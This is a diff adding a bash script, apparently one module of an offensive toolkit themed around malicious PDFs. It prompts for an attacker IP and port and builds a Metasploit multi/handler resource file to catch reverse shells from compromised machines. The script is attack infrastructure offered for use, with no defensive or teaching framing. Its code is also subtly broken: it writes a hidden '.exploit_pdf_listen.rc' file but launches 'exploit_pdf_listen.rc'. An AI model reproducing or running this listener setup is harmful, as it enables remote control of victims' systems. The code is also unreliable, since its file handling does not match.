@@ -1,0 +1,34 @@
+#!/bin/bash
+
+
+if ! which msfconsole > /dev/null; then
+   echo -e "'\e[1;93mMetasploit Framework\e[0m' not found please install it first then run the script"
+   exit
+fi
+
+
+clear
+
+echo -e "n\e[1;93m
+
+__ __         __                               _______ _______ _______
+|  |__|.-----.|  |_.-----.-----.-----.----.    |   |   |   _   |    |  |
+|  |  ||__ --||   _|  -__|     |  -__|   _|    |       |       |       |
+|__|__||_____||____|_____|__|__|_____|__|      |__|_|__|___|___|__|____|
+                                                                       \e[0m
+
+"
+
+read -p $'\n\n\e[1;91mEnter the IP address ( LHOST )\e[0m\e[1;93m : ' lhost4
+read -p $'\n\e[1;91mEnter the PORT number ( LPORT )\e[0m\e[1;93m : ' lport4
+echo && echo
+echo -e "use exploit/multi/handler\nset LHOST $lhost4\nset LPORT $lport4\nexploit" > .exploit_pdf_listen.rc
+while true; do
+  read -p $'\e[93;1mDo you want to start the MSF Listener.\e[1;97m (Y/N) \e[91;1m? : \e[1;93m' yn
+  case $yn in
+  [Yy]* ) break;;
+  [Nn]* ) clear && bash modules/funtion2.sh;;
+  * ) echo -e "\e[1;93mPlease answer it with\e[1;97m ( Y/N )\e[0m";;
+  esac
+  done
+msfconsole -r exploit_pdf_listen.rc
